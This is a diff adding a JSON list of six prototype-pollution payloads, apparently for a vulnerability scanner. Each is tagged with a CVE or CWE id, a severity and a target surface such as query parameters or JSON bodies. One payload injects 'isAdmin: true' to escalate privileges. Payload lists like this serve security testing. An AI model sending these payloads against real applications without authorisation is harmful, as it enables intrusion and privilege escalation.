@@ -1,0 +1,50 @@
+[
+  {
+    "value": "__proto__[polluted]=CVEBox",
+    "description": "Prototype pollution via __proto__ query parameter to inject global property",
+    "cveId": "CVE-2019-10744",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10744",
+    "severity": "high",
+    "surface": "query-param"
+  },
+  {
+    "value": "constructor[prototype][polluted]=CVEBox",
+    "description": "Prototype pollution via constructor.prototype path in query string",
+    "cveId": "CVE-2020-28500",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28500",
+    "severity": "high",
+    "surface": "query-param"
+  },
+  {
+    "value": "{\"__proto__\": {\"polluted\": \"CVEBox\"}}",
+    "description": "JSON body prototype pollution via __proto__ key injection",
+    "cveId": "CVE-2021-23337",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23337",
+    "severity": "critical",
+    "surface": "api-body"
+  },
+  {
+    "value": "{\"constructor\": {\"prototype\": {\"polluted\": \"CVEBox\"}}}",
+    "description": "JSON body prototype pollution via constructor.prototype path",
+    "cveId": "CVE-2022-21824",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21824",
+    "severity": "critical",
+    "surface": "api-body"
+  },
+  {
+    "value": "{\"__proto__\": {\"isAdmin\": true}}",
+    "description": "Prototype pollution to inject isAdmin:true and escalate privileges",
+    "cveId": "CVE-2019-10744",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10744",
+    "severity": "critical",
+    "surface": "api-body"
+  },
+  {
+    "value": "Object.prototype.polluted=CVEBox",
+    "description": "Direct Object.prototype assignment attempt via form input",
+    "cveId": "CWE-1321",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution",
+    "severity": "high",
+    "surface": "form"
+  }
+]
